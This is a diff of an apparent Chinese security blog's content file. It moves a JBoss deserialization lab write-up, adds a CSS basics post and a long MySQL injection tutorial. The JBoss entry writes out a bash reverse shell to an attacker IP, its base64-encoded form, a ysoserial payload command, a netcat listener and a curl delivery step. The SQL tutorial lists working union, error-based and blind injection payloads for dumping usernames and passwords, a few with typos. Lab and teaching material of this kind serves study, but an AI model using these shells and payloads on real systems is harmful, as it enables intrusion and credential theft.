-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
-
-<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
-<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
-
-<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
-
-<p>注：poc版本&gt;=5</p>
-<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
+<p>引用方式</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内联样式</td>
+<td>在HTML元素中使用style属性，只对当前标记里的内容有效   <br><code>&lt;p  style=&quot;display:none&quot;&gt;&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>内部样式表</td>
+<td>在HTML文档头部head区域使用<code>&lt;style&gt;</code>元素，包含CS，全局声明，调用  <br><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;</code><br><code>&lt;/style&gt;</code></td>
+</tr>
+<tr>
+<td>外部引用</td>
+<td>外部CSS，通过<code>&lt;link&gt;</code>标签引入外部的CSS文件 <br><code>&lt;link  rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;样式表文件的地址&quot;&gt;</code></td>
+</tr>
+</tbody></table>
+<p>内部样式表总结</p>
+<table>
+<thead>
+<tr>
+<th>样式</th>
+<th>语法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>类选择符</td>
+<td><code>&lt;style  type=&quot;text/css&quot;&gt;  </code><br><code>.sfont&#123;  font-size:12px; </code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt; </code><br><code>&lt;p  class=&quot;sfont&quot;&gt;…&lt;/p&gt; </code></td>
+</tr>
+<tr>
+<td>ID选择符</td>
+<td><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>#sfont&#123; </code><br><code>font-size:12px;</code><br><code>color:red;  &#125; </code><br><code>&lt;/style&gt; </code>   <br><code>&lt;p id=&quot;sfont&quot;&gt;…&lt;/p&gt;  </code></td>
+</tr>
+<tr>
+<td>类型选择符</td>
+<td><code>&lt;style  type=&quot;text/css&quot;&gt; </code><br><code>p&#123;</code><br><code>font-size:12px;</code><br><code>color:red;  &#125;</code><br><code>&lt;/style&gt;  </code><br><code> &lt;p&gt;…&lt;/p&gt; </code></td>
+</tr>
+</tbody></table>
+<p>样式表冲突</p>
+<p>当多种样式作用于同一标记的同一属性时，会发生样式表冲突</p>
+<p>优先原则</p>
+<p>同一选择符：按就近原则</p>
+<p>不同选择符：内联 &gt; ID &gt; 类 &gt; 类型 &gt; 外部</p>
+<p>定位符</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>position</td>
+<td></td>
+</tr>
+<tr>
+<td>fixed<br>绝对定位</td>
+<td><code>&lt;view  style=&#39;position:fixed;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code></td>
+</tr>
+<tr>
+<td>absolute<br>绝对定位</td>
+<td><code>&lt;view  style=&#39;position:absolute;&#39;&gt; </code><br><code>&lt;image style=&#39; width:102px;  height:110px&#39; src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt; </code> <br>在没有使用 “left”, “top”, “right” 以及 “bottom” 属性之前，基于文档流的位置停留在在文档流之外，  随着滚动并不一直停留在屏幕中。     <br><br><code>&lt;view  style=&#39;position:absolute;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code>  <br>在使用 “left”, “top”, “right” 以及 “bottom” 属性之后，位置就不是基于文档流时候的位置，  而是根据这些设置的属性基于整个屏幕的位置确定的。随着滚动并不一直停留在屏幕中。</td>
+</tr>
+<tr>
+<td>relative<br>相对定位</td>
+<td><code>&lt;html&gt;  &lt;head&gt; </code><br><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>h2.pos_left  &#123;  position:relative;  left:-20px  &#125; </code><br><code>h2.pos_right  &#123;  position:relative;  left:20px  &#125; </code><br><code>.container&#123;   margin-left:100px;   border:5px solid #405f80;  &#125;</code><br><code>&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt; </code><br><code> &lt;div class=&quot;container&quot;&gt; </code><br><code>   &lt;h2&gt;这是位于正常位置的标题&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_left&quot;&gt;这个标题相对于其正常位置向左移动&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_right&quot;&gt;这个标题相对于其正常位置向右移动&lt;/h2&gt; </code><br><code>&lt;/div&gt;  &lt;/body&gt;     &lt;/html&gt;  </code></td>
+</tr>
+</tbody></table>
+]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>编程基础</category>
       </categories>
       <tags>
-        <tag>JBoss</tag>
+        <tag>HTML</tag>
+        <tag>CSS</tag>
       </tags>
   </entry>
   <entry>
@@ -1688,6 +1656,38 @@
       </categories>
       <tags>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss反序列化漏洞复现</title>
+    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
+<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
+<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
+<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
+<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
+<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
+<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
+<p>攻击机：192.168.66.138</p>
+<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
+
+<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
+
+<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
+<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
+
+<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
+
+<p>注：poc版本&gt;=5</p>
+<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>JBoss</tag>
       </tags>
   </entry>
   <entry>
@@ -2180,6 +2180,563 @@
       </categories>
       <tags>
         <tag>MS17-010</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入</title>
+    <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>端口：3306</p>
+<h1 id="一、SQL注入产生原因"><a href="#一、SQL注入产生原因" class="headerlink" title="一、SQL注入产生原因"></a>一、SQL注入产生原因</h1><p>1、不当的类型处理</p>
+<p>2、不安全的数据库配置</p>
+<p>3、不合理的查询集处理</p>
+<p>4、不当的错误处理</p>
+<p>5、转义字符处理不合适</p>
+<p>6、多个提交处理不当</p>
+<h1 id="二、SQL注入关键条件"><a href="#二、SQL注入关键条件" class="headerlink" title="二、SQL注入关键条件"></a>二、SQL注入关键条件</h1><p>1、用户能控制输入的内容</p>
+<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
+<p>SQL注入分类</p>
+<table>
+<thead>
+<tr>
+<th align="left">分类</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">根据请求方式分类 （判断注入工具：Burpsuite等）</td>
+<td align="left">GET方式请求注入 POST方式请求注入</td>
+</tr>
+<tr>
+<td align="left">根据注入点参数分类 （判断手法：’、”、\）</td>
+<td align="left">字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）</td>
+</tr>
+<tr>
+<td align="left">根据SQL注入点反馈类型分类（重点） （判断注入payload）</td>
+<td align="left">union类型 基于错误显示 布尔类型 基于时间 其他类型</td>
+</tr>
+<tr>
+<td align="left">根据Web应用的数据库类型分类 （判断注入语句）</td>
+<td align="left">MySQL SQLServer Oracle Access</td>
+</tr>
+</tbody></table>
+<p>基于反馈类型分类注入流程</p>
+<table>
+<thead>
+<tr>
+<th align="left">方式</th>
+<th align="left">选择条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">union联合查询</td>
+<td align="left">有显示位</td>
+</tr>
+<tr>
+<td align="left">报错注入</td>
+<td align="left">mysql_error调试未删除，控制报错信息</td>
+</tr>
+<tr>
+<td align="left">bool盲注</td>
+<td align="left">页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面</td>
+</tr>
+<tr>
+<td align="left">时间延时盲注</td>
+<td align="left">页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断</td>
+</tr>
+</tbody></table>
+<p><strong>万能密码</strong></p>
+<pre class="highlight"><span class="line">admin&#x27; or 1=&#x27;1</span><br></pre>
+
+<p>语境</p>
+<pre class="highlight"><span class="line">select * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;</span><br></pre>
+
+<p>关键：</p>
+<p>使用or进行逻辑判断，构造true语句，使得整个判断语句为true</p>
+<h1 id="三、手工注入流程"><a href="#三、手工注入流程" class="headerlink" title="三、手工注入流程"></a>三、手工注入流程</h1><p>1、判断换是否有注入漏洞，识别注入点类型</p>
+<p>2、获取数据库中的信息</p>
+<p> 获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
+<p> 获取数据库库名</p>
+<p> 获取表名</p>
+<p> 获取列名</p>
+<p> 获取用户数据</p>
+<p>3、破解加密数据（数据解密）</p>
+<p>4、提升权限（配合其他漏洞）</p>
+<p>5、内网渗透（配合其他漏洞）</p>
+<h1 id="四、详细过程"><a href="#四、详细过程" class="headerlink" title="四、详细过程"></a>四、详细过程</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="1、判断是否存在注入漏洞"><a href="#1、判断是否存在注入漏洞" class="headerlink" title="1、判断是否存在注入漏洞"></a>1、判断是否存在注入漏洞</h3><p>（需要结合数据情景，判断可能使用的sql语句）</p>
+<p>找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包</p>
+<p>1、参数后加 <code>&#39; &quot; \</code>（全加），判断页面是否异常（\必出异常，不用做后续判断）</p>
+<p>2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。</p>
+<p>&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）</p>
+<p>3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。</p>
+<p>&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。</p>
+<p>4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。</p>
+<h3 id="2、判断数据库列数"><a href="#2、判断数据库列数" class="headerlink" title="2、判断数据库列数"></a>2、判断数据库列数</h3><p>order by + 数字</p>
+<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
+<p><code>&#39; order by 5#</code></p>
+<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
+<p>然后使用union select联合查,寻找显示位：</p>
+<p><code>id = -2 union select 1,2,3,4；</code></p>
+<h3 id="3、数据库信息查询"><a href="#3、数据库信息查询" class="headerlink" title="3、数据库信息查询"></a>3、数据库信息查询</h3><table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查库名</td>
+<td align="left"><code>-1 union select 1,2,database()-- a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查列名</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>-1 union select 1,2,(select concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
+</tr>
+</tbody></table>
+<p><strong>注意</strong>：</p>
+<p>1、union select查询列数要与前面列数相同</p>
+<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
+<p>如</p>
+<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;</span><br></pre>
+
+<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
+<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
+<p>即</p>
+<pre class="highlight"><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()</span><br></pre>
+
+
+
+<p><strong>数据库常用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">version()</td>
+<td align="left">数据库版本号</td>
+</tr>
+<tr>
+<td align="left">database()</td>
+<td align="left">当前数据库</td>
+</tr>
+<tr>
+<td align="left">user()</td>
+<td align="left">当前用户</td>
+</tr>
+<tr>
+<td align="left">current_user()</td>
+<td align="left">当前用户名</td>
+</tr>
+<tr>
+<td align="left">system_user()</td>
+<td align="left">系统用户名</td>
+</tr>
+<tr>
+<td align="left">@@datadir</td>
+<td align="left">数据库路径</td>
+</tr>
+<tr>
+<td align="left">@@version_compile_os</td>
+<td align="left">操作系统版本</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">常用函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">limit</td>
+<td align="left">限制查询数量，下标从0开始 limit 0,1 从0开始查两个</td>
+</tr>
+<tr>
+<td align="left">length()</td>
+<td align="left">计算数据长度</td>
+</tr>
+<tr>
+<td align="left">count()</td>
+<td align="left">计算数据行数</td>
+</tr>
+<tr>
+<td align="left">mid(str,1,30)</td>
+<td align="left">截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
+</tr>
+<tr>
+<td align="left">substr(str,0,30)</td>
+<td align="left">0为截取初始位，包含整个查询语句</td>
+</tr>
+<tr>
+<td align="left">ascii()</td>
+<td align="left">转为ascii码</td>
+</tr>
+</tbody></table>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h3><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">updatexml(arg1,arg2,arg3) <br>查询符合条件的数据 XPATH路径报错</td>
+<td align="left">and updatexml(1,concat(0x5e,(select user()),0x5e),1)  <br>mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同</td>
+</tr>
+<tr>
+<td align="left">extractvalue(arg1,arg2) <br>同上，两个参数 XPATH路径报错</td>
+<td align="left">and extractvalue(1,concat(0x5e,(select user()),0x5e))  <br>mysql5.1及以上版本,输出有32位长度限制</td>
+</tr>
+<tr>
+<td align="left">floor() <br>返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错</td>
+<td align="left">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  <br>mysql5.0及以上版本，user()可变，其他固定</td>
+</tr>
+<tr>
+<td align="left">name_const(name,value) <br>产生一个结果集合列 列名重复报错</td>
+<td align="left">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  <br>mysql5.0及以下</td>
+</tr>
+<tr>
+<td align="left">exp() 以e为底的指数函数 整形溢出报错</td>
+<td align="left">and exp(~(select * from (select user()) a))  <br>mysql5.5.5及以上版本</td>
+</tr>
+<tr>
+<td align="left">几何函数报错（不满足要求就会报错） <br>geometrycollection() <br>multipoint() <br>polygon() <br>multipolygon() <br>linestring() <br>multilinestring()</td>
+<td align="left">and multipoint((select * from (select * from (select * from (select version())a)b)c))</td>
+</tr>
+</tbody></table>
+<h3 id="2、用法："><a href="#2、用法：" class="headerlink" title="2、用法："></a>2、用法：</h3><p>将对应user()等地方替换为要执行的sql语句即可</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查数据库名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查表名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查列名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
+</tr>
+<tr>
+<td align="left">查数据</td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
+</tr>
+</tbody></table>
+<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
+<p>1、用法：</p>
+<p>ascii码二分法</p>
+<table>
+<thead>
+<tr>
+<th align="left">说明</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">先判断数据长度或个数</td>
+<td align="left">and length((select database())) &gt; 64</td>
+</tr>
+<tr>
+<td align="left">然后进行二分法匹配</td>
+<td align="left">and ascii(mid((select database()),1,1)) &gt;64</td>
+</tr>
+</tbody></table>
+<p>2、语句（省略二分法，直接用=号）</p>
+<p>n均为前一句获取的长度值</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库长度</td>
+<td align="left"><code>and (length(database()))=8</code> <br>注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td align="left">获取数据库名</td>
+<td align="left"><code>and ascii((select mid(database(),1,1)))=115 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表长度</td>
+<td align="left"><code>and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列长度</td>
+<td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列名</td>
+<td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据长度</td>
+<td align="left"><code>and length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据</td>
+<td align="left"><code>and ascii((select mid(concat(username,0x7e,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
+</tr>
+</tbody></table>
+<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
+<p>基于sql盲注，为升级版本</p>
+<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
+<p>1、判断：</p>
+<p><code>&#39; &quot; \</code></p>
+<p><code>&#39;and sleep(3) %23</code></p>
+<p><code>&#39; and sleep(3))%23</code></p>
+<p>…</p>
+<p>方法同判断截断字符</p>
+<p>2、用法：</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">if</td>
+<td align="left">select if(arg1,arg2,arg3) <br>arg1：判断条件 <br>arg2：条件为真时执行的语句 <br>arg3：条件为假时执行的语句  <br>常用： <br>and select if((length(database())&gt;5),sleep(5),1) –a</td>
+</tr>
+<tr>
+<td align="left">case when</td>
+<td align="left">select case when arg1 then arg2 else arg3 end; <br>arg1：判断条件 <br>arg2：条件为真时执行的语句<br>arg3：条件为假时执行的语句  <br>常用： <br>and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
+</tr>
+</tbody></table>
+<p>3、语句如下（省略二分法，直接用=号）</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取数据库长度</td>
+<td align="left"><code>and if((length(database()))=8),sleep(3),1)-- a</code> <br>注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td align="left">获取数据库名</td>
+<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表长度</td>
+<td align="left"><code>and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取表名</td>
+<td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列长度</td>
+<td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取列名</td>
+<td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取数据长度</td>
+<td align="left"><code>and if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+<tr>
+<td align="left">获取字段名</td>
+<td align="left"><code>and if((ascii((select mid(concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+</tr>
+</tbody></table>
+<p>注： sleep可用benchmark代替</p>
+<p><code>benchmark(arg1,arg2)</code></p>
+<p>arg1为执行次数，arg2为执行语句</p>
+<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
+<p>benchmark(5000000,md5(123)) 执行500万次MD5加密</p>
+<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
+<h1 id="五、其他注入类型"><a href="#五、其他注入类型" class="headerlink" title="五、其他注入类型"></a>五、其他注入类型</h1><h2 id="1、请求头注入"><a href="#1、请求头注入" class="headerlink" title="1、请求头注入"></a>1、请求头注入</h2><table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">User-Agent</td>
+<td align="left">浏览器版本</td>
+</tr>
+<tr>
+<td align="left">X-Forwarded-For</td>
+<td align="left">获取HTTP请求端的真实IP</td>
+</tr>
+</tbody></table>
+<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
+<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
+<p>报错注入和bool盲注</p>
+<h3 id="2、内联注入"><a href="#2、内联注入" class="headerlink" title="2、内联注入"></a>2、内联注入</h3><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
+<p>找到留言板的显示位，在显示位上进行sql注入。</p>
+<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
+<p>使用</p>
+<p>不用注释，用截断代替，然后使用多个and/or连接</p>
+<p>注：前面为true用and；前面为false用or</p>
+<p>1、<code>&#39;firefox&#39; and &#39;</code>补齐</p>
+<p>2、<code>&#39;firefox&#39; and payload and &#39;</code></p>
+<h3 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h3><p>（单双引号页面无变化）</p>
+<p>mysql语句执行时，现将数据转成16进制，再执行</p>
+<p>GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</p>
+<p>ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</p>
+<p>当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</p>
+<p>当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</p>
+<p>形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</p>
+<p>原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</p>
+<p>但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</p>
+<p>此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</p>
+<p><strong>用法：</strong></p>
+<p>注意：通常出现在斜杠转义单双引号的网页</p>
+<p>利用：构造?id=1%df’即可</p>
+<p>%df可以为任何hex码在81-FE之间的数据</p>
+<p><strong>宽字节注入存在条件</strong></p>
+<p>PHP+Mysql+GBK</p>
+<p><strong>编码语句：</strong></p>
+<pre class="highlight"><span class="line">mysql_set_charset(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;set names gbk&quot;)</span><br></pre>
+
+<p>转义语句：</p>
